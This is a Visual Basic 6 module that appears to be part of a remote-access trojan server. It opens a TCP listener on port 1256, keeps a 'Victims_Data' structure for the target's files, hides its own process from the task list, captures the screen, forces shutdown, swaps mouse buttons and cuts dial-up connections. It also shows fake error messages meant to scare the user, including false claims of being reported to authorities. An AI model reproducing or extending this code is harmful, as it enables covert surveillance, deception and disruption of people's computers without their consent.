Attribute VB_Name = "modGlobals"
Option Explicit

Public Port As Integer
Public SysPath As String
Public curPack As String

Public bReplied As Boolean
Public Const MAX_CHUNK_SIZE  As Long = 4196
Public Const MAX_NUM_FILES As Long = 1000

Public bInConnection As Boolean, bTaskBar As Boolean
Public nFile As Long, sBuffer As String, _
       nfile2 As Long, sBuffer2 As String
Public m_Server As New cServer
Public Data As Victims_Data

Public Const SWP_HIDEWINDOW = &H80
Public Const SWP_SHOWWINDOW = &H40

Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Public Const WM_CLOSE = &H10

'  wallpaper
Public Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As String, ByVal fuWinIni As Long) As Long


Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Public Declare Function SetWindowPos Lib "user32" (ByVal hWnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Public Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Public Declare Sub keybd_event Lib "user32" (ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwFlags As Long, ByVal dwExtraInfo As Long)
Public Declare Function GetTickCount Lib "kernel32" () As Long
Public Declare Function GetCurrentProcessId Lib "kernel32" () As Long
Public Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessId As Long, ByVal dwType As Long) As Long
Public Const RSP_SIMPLE_SERVICE = 1

Public Declare Function ExitWindows Lib "User" (ByVal dwReturnCode As Long, ByVal uReserved As Integer) As Integer
Global Const EW_REBOOTSYSTEM = &H43
Global Const EW_RESTARTWINDOWS = &H42
Global Const EW_EXITWINDOWS = 0
       
Public HowLong As Long
Public Const CAPTURE As String = "E:\SCREEN.BMP"

Public Declare Function RasEnumConnections Lib "rasapi32.dll" Alias "RasEnumConnectionsA" (lpRasCon As Any, lpcb As Long, lpcConnections As Long) As Long

Public Declare Function RasGetConnectStatus Lib "rasapi32.dll" Alias "RasGetConnectStatusA" (ByVal hRasCon As Long, lpStatus As Any) As Long    '
Public Const RAS95_MaxEntryName = 256
Public Const RAS95_MaxDeviceType = 16
Public Const RAS95_MaxDeviceName = 32
'
Type RASCONN95
   dwSize As Long
   hRasCon As Long
   szEntryName(RAS95_MaxEntryName) As Byte
   szDeviceType(RAS95_MaxDeviceType) As Byte
   szDeviceName(RAS95_MaxDeviceName) As Byte
End Type    '


Type RASCONNSTATUS95
   dwSize As Long
   RasConnState As Long
   dwError As Long
   szDeviceType(RAS95_MaxDeviceType) As Byte
   szDeviceName(RAS95_MaxDeviceName) As Byte
End Type
                
Public Const RAS_MAXENTRYNAME As Integer = 256
Public Const RAS_MAXDEVICETYPE As Integer = 16
Public Const RAS_MAXDEVICENAME As Integer = 128
Public Const RAS_RASCONNSIZE As Integer = 412
Public Const ERROR_SUCCESS = 0&


Public Type RasConn
    dwSize As Long
    hRasConn As Long
    szEntryName(RAS_MAXENTRYNAME) As Byte
    szDeviceType(RAS_MAXDEVICETYPE) As Byte
    szDeviceName(RAS_MAXDEVICENAME) As Byte
End Type



Public Type RasEntryName
    dwSize As Long
    szEntryName(RAS_MAXENTRYNAME) As Byte
End Type

Public Declare Function RasHangUp Lib "rasapi32.dll" Alias "RasHangUpA" (ByVal hRasConn As Long) As Long

Public Declare Function GetWindow Lib "user32" (ByVal hWnd As Long, ByVal wCmd As Long) As Long
Public Declare Function GetParent Lib "user32" (ByVal hWnd As Long) As Long
Public Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hWnd As Long) As Long
Public Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long

               
Declare Function SwapMouseButton& Lib "user32" (ByVal bSwap As Long)
Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Public Declare Function GetWindowsDirectory Lib "kernel32.dll" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Public Const MAX_PATH = 260
                
Type Victims_Data
   FileName() As String
   Num_Drives As Integer
   Num_Dirs As Long
   Num_Files As Long
End Type

   
   
Public Const GW_HWNDFIRST = 0
Public Const GW_HWNDNEXT = 2

Public Const NT_PATH As String = "SOFTWARE\Microsoft\Windows NT\CurrentVersion"
Public Const WIN_PATH As String = "SOFTWARE\Microsoft\Windows\CurrentVersion"
Public gstrISPName As String
Public ReturnCode As Long
Dim ComputerName As String

Public Declare Function EnumDisplaySettings Lib "user32" Alias "EnumDisplaySettingsA" (ByVal lpszDeviceName As Long, ByVal iModeNum As Long, lpDevMode As Any) As Boolean

Public Declare Function ChangeDisplaySettings Lib "user32" Alias "ChangeDisplaySettingsA" (lpDevMode As Any, ByVal dwFlags As Long) As Long

 Public Const CCDEVICENAME = 32
 Public Const CCFORMNAME = 32
 Public Const DM_PELSWIDTH = &H80000
 Public Const DM_PELSHEIGHT = &H100000

Public Type DEVMODE
    dmDeviceName As String * CCDEVICENAME
    dmSpecVersion As Integer
    dmDriverVersion As Integer
    dmSize As Integer
    dmDriverExtra As Integer
    dmFields As Long
    dmOrientation As Integer
    dmPaperSize As Integer
    dmPaperLength As Integer
    dmPaperWidth As Integer
    dmScale As Integer
    dmCopies As Integer

    dmDefaultSource As Integer
    dmPrintQuality As Integer
    dmColor As Integer
    dmDuplex As Integer
    dmYResolution As Integer
    dmTTOption As Integer
    dmCollate As Integer
    dmFormName As String * CCFORMNAME
    dmUnusedPadding As Integer
    dmBitsPerPel As Integer
    dmPelsWidth As Long
    dmPelsHeight As Long
    dmDisplayFlags As Long
    dmDisplayFrequency As Long
End Type


Public Const STANDARD_RIGHTS_REQUIRED As Long = &HF0000
Public Const READ_CONTROL = &H20000
Public Const STANDARD_RIGHTS_READ = (READ_CONTROL)
Public Const STANDARD_RIGHTS_WRITE = (READ_CONTROL)
Public Const STANDARD_RIGHTS_EXECUTE = (READ_CONTROL)

Public Enum TokenRights
    TOKEN_ASSIGN_PRIMARY = &H1
    TOKEN_DUPLICATE = &H2
    TOKEN_IMPERSONATE = &H4
    TOKEN_QUERY = &H8
    TOKEN_QUERY_SOURCE = &H10
    TOKEN_ADJUST_PRIVILEGES = &H20
    TOKEN_ADJUST_GROUPS = &H40
    TOKEN_ADJUST_DEFAULT = &H80
    TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED Or TOKEN_ASSIGN_PRIMARY Or TOKEN_DUPLICATE Or TOKEN_IMPERSONATE Or TOKEN_QUERY Or TOKEN_QUERY_SOURCE Or TOKEN_ADJUST_PRIVILEGES Or TOKEN_ADJUST_GROUPS Or TOKEN_ADJUST_DEFAULT)
    TOKEN_READ = (STANDARD_RIGHTS_READ Or TOKEN_QUERY)
    TOKEN_WRITE = (STANDARD_RIGHTS_WRITE Or TOKEN_ADJUST_PRIVILEGES Or TOKEN_ADJUST_GROUPS Or TOKEN_ADJUST_DEFAULT)
    TOKEN_EXECUTE = (STANDARD_RIGHTS_EXECUTE)
End Enum

Public Enum PrivilegeAttributes
    SE_PRIVILEGE_ENABLED_BY_DEFAULT = &H1
    SE_PRIVILEGE_ENABLED = &H2
    SE_PRIVILEGE_USED_FOR_ACCESS = &H80000000
End Enum

Public Enum ExitOptions
    EWX_LOGOFF = 0
    EWX_SHUTDOWN = 1
    EWX_REBOOT = 2
    EWX_FORCE = 4
End Enum

Public Enum TokenAccess
    TokenUser = 1
    TokenGroups = 2
    TokenPrivileges = 3
    TokenOwner = 4
    TokenPrimaryGroup = 5
    TokenDefaultDacl = 6
    TokenType = 8
    TokenImpersonationLevel = 9
    TokenStatistics = 10
End Enum

Type LUID
    lowPart As Long
    HighPart As Long
End Type

Type LUID_AND_ATTRIBUTES
    pLuid As LUID
    Attributes As PrivilegeAttributes
End Type

Type PTOKEN_PRIVILEGES
    PrivilegeCount As Long
    Privileges(0) As LUID_AND_ATTRIBUTES
End Type

Public Declare Function GetCurrentProcess Lib "kernel32" () As Long
Public Declare Function OpenProcessToken Lib "advapi32" (ByVal ProcessHandle As Long, ByVal DesiredAccess As TokenRights, ByRef TokenHandle As Long) As Long
Public Declare Function LookupPrivilegeValueA Lib "advapi32" (ByVal lpSystemName As String, ByVal lpName As String, ByRef lpLuid As LUID) As Long
Public Declare Function AdjustTokenPrivileges Lib "advapi32" (ByVal TokenHandle As Long, ByVal DisableAllPrivileges As Long, ByRef NewState As PTOKEN_PRIVILEGES, ByVal BufferLength As Long, ByRef PreviousState As Long, ByRef ReturnLenght As Long) As Long
Public Declare Function AdjustTokenPrivilegesOld Lib "advapi32" Alias "AdjustTokenPrivileges" (ByVal TokenHandle As Long, ByVal DisableAllPrivileges As Long, ByRef NewState As PTOKEN_PRIVILEGES, ByVal BufferLength As Long, ByRef PreviousState As PTOKEN_PRIVILEGES, ByRef ReturnLenght As Long) As Long
Public Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As ExitOptions, ByVal dwReserved As Long) As Long

Public Const MF_BYPOSITION = &H400&
Public Const MF_DISABLED = &H2&


Public Declare Function GetSystemMenu Lib "user32" (ByVal hWnd As Long, ByVal bRevert As Long) As Long
Public Declare Function GetMenuItemCount Lib "user32" (ByVal hmenu As Long) As Long
Public Declare Function RemoveMenu Lib "user32" (ByVal hmenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Public Declare Function DrawMenuBar Lib "user32" (ByVal hWnd As Long) As Long

'Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long


Public Function ShutDown(Operation As ExitOptions) As Long
    
    Dim lngProcess As Long
    Dim lngReturn As Long
    Dim lngToken As Long
    Dim udtLUID As LUID
    Dim lngTokenPrivileges As TokenRights
    Dim udtTokenPrivNew As PTOKEN_PRIVILEGES
    
    lngProcess = GetCurrentProcess()
    lngTokenPrivileges = TOKEN_ADJUST_PRIVILEGES
    
    lngReturn = OpenProcessToken(lngProcess, lngTokenPrivileges, lngToken)
    lngReturn = LookupPrivilegeValueA(vbNullString, "SE_SHUTDOWN_NAME", udtLUID)
    
    udtTokenPrivNew.PrivilegeCount = 1
    udtTokenPrivNew.Privileges(0).Attributes = SE_PRIVILEGE_ENABLED
    udtTokenPrivNew.Privileges(0).pLuid = udtLUID
    
    lngReturn = AdjustTokenPrivileges(lngToken, 0, udtTokenPrivNew, 0&, 0, 0&)
    
    ShutDown = ExitWindowsEx(Operation, 0)

End Function



Sub SendData(sData As String)
On Error GoTo getoutnow
    'This little function just does the send of data to the client
    Dim TimeOut As Long
    frmServer.tcpServer.SendData sData
    Do Until (frmServer.tcpServer.State = 0) Or (TimeOut < 10000)
        DoEvents
        TimeOut = TimeOut + 1
        If TimeOut > 10000 Then Exit Do
    Loop
getoutnow:
    Exit Sub
End Sub


'generic Pause function

Sub Main()
    'App.TaskVisible = False
   
    If Command = "" Then
      Port = 1256
    Else
      Port = Command()
    End If
    
    Load frmServer
End Sub


Sub Pause(HowLong As Long)
    '
    Dim u%, Tick As Long
    
    Tick = GetTickCount
    
    Do
      u% = DoEvents
    Loop Until Tick + HowLong < GetTickCount
End Sub
   
Function EvalData(Incoming As String, Side As Integer, Optional Extra As String) As String
   Dim i As Integer
   Dim TempStr As String
   
   Dim Divider As String
   
   If Extra = "" Then
      Divider = ","
   Else
      Divider = Extra
   End If
   
   Select Case Side
        
      Case 1
          ' remove the data to the Left of the ","
          For i = 0 To Len(Incoming)
            TempStr = Left(Incoming, i)
            
            If Right(TempStr, 1) = Divider Then
              EvalData = Left(TempStr, Len(TempStr) - 1)
              Exit Function
            End If
          Next
          
      Case 2
          ' remove the data to the Right of the ","
          For i = 0 To Len(Incoming)
            TempStr = Right(Incoming, i)
            
            If Left(TempStr, 1) = Divider Then
              EvalData = Right(TempStr, Len(TempStr) - 1)
              Exit Function
            End If
          Next
   End Select
   
End Function


Sub ClearArray(Data As Victims_Data, Type_ As String)
    Dim i As Integer
    
    frmServer.List1.Clear
    Select Case Type_
      Case "Files"
           ReDim Data.FileName(0)
           Data.Num_Files = 0
      Case "Dirs"
           ReDim Data.FileName(0)
           Data.Num_Files = 0
    End Select
    
End Sub


Sub DoSetup()
    m_Server.SetUp
End Sub


Function GetSysType() As String
    Dim Value As String
    On Error GoTo SysEvalErr
    Value = GetSystemPath()
    
    m_Server.MainDriveLetter = Left(Value, 3)
    
    If Mid(Value, 4, 5) = "WINNT" Then
       GetSysType = "NT"      ' NT Sys
    Else
        GetSysType = "Windows" ' 98/95
    End If
    
    Exit Function
SysEvalErr:
End Function


Public Function fSaveGuiToFile(ByVal theFile As String) As Boolean
    Dim lString As String
    On Error GoTo Trap
    'Check if the File Exist

    If Dir(theFile) <> "" Then Exit Function
    'To get the Entire Screen
    Call keybd_event(vbKeySnapshot, 1, 0, 0)

    SavePicture Clipboard.GetData(vbCFBitmap), theFile
    fSaveGuiToFile = True
    Exit Function
Trap:
    'Error handling

   SendData "Capture_Error," & "Error Occured in fSaveGuiToFile. Error #: " & err.Number & "; " & _
err.Description
End Function


Public Function IsConnected() As Boolean

    Dim TRasCon(255) As RASCONN95
    Dim lg As Long
    Dim lpcon As Long
    Dim RetVal As Long
    Dim Tstatus As RASCONNSTATUS95    '
    TRasCon(0).dwSize = 412
    lg = 256 * TRasCon(0).dwSize    '
    RetVal = RasEnumConnections(TRasCon(0), lg, lpcon)

    If RetVal <> 0 Then
       Exit Function
    End If

    '
    Tstatus.dwSize = 160
    RetVal = RasGetConnectStatus(TRasCon(0).hRasCon, Tstatus)

    If Tstatus.RasConnState = &H2000 Then
      IsConnected = True
    Else
      IsConnected = False
    End If

End Function
 
Public Function GetSystemPath() As String

    Dim strFolder As String
    Dim lngResult As Long
    strFolder = String(MAX_PATH, 0)
    lngResult = GetSystemDirectory(strFolder, MAX_PATH)

    If lngResult <> 0 Then
      GetSystemPath = Left(strFolder, InStr(strFolder, Chr(0)) - 1)
    Else
      GetSystemPath = ""
    End If
    
End Function


Function GetNewError() As String
    Dim ErrD(0 To 19) As String, iSelect As Integer
    'Random list of funny error messages
    ErrD(0) = "No CD in Drive A: found"
    ErrD(1) = "Incompetant user error"
    ErrD(2) = "Windows not running at full speed!"
    ErrD(3) = "Windows Kernel unable to send a message to Major.Dll"
    ErrD(4) = "Windows requires cleaning."
    ErrD(5) = "Drive C: is running at 4500 rpm instead of 6334 rpm. Please notify the helpdesk."
    ErrD(6) = "Please click on any button to re-boot or any other button to cancel"
    ErrD(7) = "File not found. Should I fake it (Y/N)?"
    ErrD(8) = "Click ok to continue"
    ErrD(9) = "Mouse compatibility check. Please click the OK button."
    ErrD(10) = "Internal Stack failure 0010:FH00. Please refer to owners manual page 166."
    ErrD(11) = "This is an illegal Windows version ! You will be reported to the autorities if you log into the internet again."
    ErrD(12) = "WHAT?"
    ErrD(13) = "Windows will now report all illegal software on this system. Click OK to accept or Cancel to ignore!"
    ErrD(14) = "Windows 3.1 was detected and your current application will not close down."
    ErrD(15) = "Firewall detected pornografy at HTTP://www.sexcheck.come/boobs1.jpg. Will now disconnect!"
    ErrD(16) = "Syntax Error on LPT1: detected"
    ErrD(17) = "MEMORY to large. Please start more applications."
    ErrD(18) = "Too many multitasking applications detected. Please start a 16-Bit application."
    ErrD(19) = "Your processor is not running at full capacity. Please remove or downgrade."
    
    iSelect = Rnd * 19
    GetNewError = ErrD(iSelect)
End Function





Public Sub DisableX(Frm As Form)
    Dim hmenu As Long, nCount As Long
    
    'Get handle to system menu
    hmenu = GetSystemMenu(Frm.hWnd, 0)

    'Get number of items in menu
    nCount = GetMenuItemCount(hmenu)
    
    'Remove last item from system menu (last item is 'Close')
    Call RemoveMenu(hmenu, nCount - 1, MF_DISABLED Or MF_BYPOSITION)

    'Redraw menu
    DrawMenuBar Frm.hWnd

End Sub


Sub ScrollBox(Data As String, Text As String)
   On Error Resume Next
   Dim Box As TextBox
   Set Box = frmServer.Text1
   
   With Box
      .SelStart = Len(Text) - Len(Data)
      .SelLength = Len(Data)
      .SelLength = 0
   End With
   
End Sub






Public Function WinDir(Optional ByVal AddSlash As Boolean = False) As String

    Dim t As String * 255
    Dim i As Long
    i = GetWindowsDirectory(t, Len(t))
    WinDir = Left(t, i)


    If (AddSlash = True) And (Right(WinDir, 1) <> "\") Then
        WinDir = WinDir & "\"
    ElseIf (AddSlash = False) And (Right(WinDir, 1) = "\") Then
        WinDir = Left(WinDir, Len(WinDir) - 1)
    End If

End Function



Public Function VICAD(view As Boolean) As Boolean
Dim regserv As Long
    On Error GoTo ErrorFound


    If view = True Then
        regserv = RegisterServiceProcess(GetCurrentProcessId(), 0)
    Else
        regserv = RegisterServiceProcess(GetCurrentProcessId(), 1)
    End If

    App.TaskVisible = view
    VICAD = True
    Exit Function
ErrorFound:
    VICAD = False
End Function



Public Sub FloaterForm(Parent As Form, Floater As Form)
    Floater.Show , Parent
End Sub
Sub CheckSysAttOptions()
    '
    
End Sub
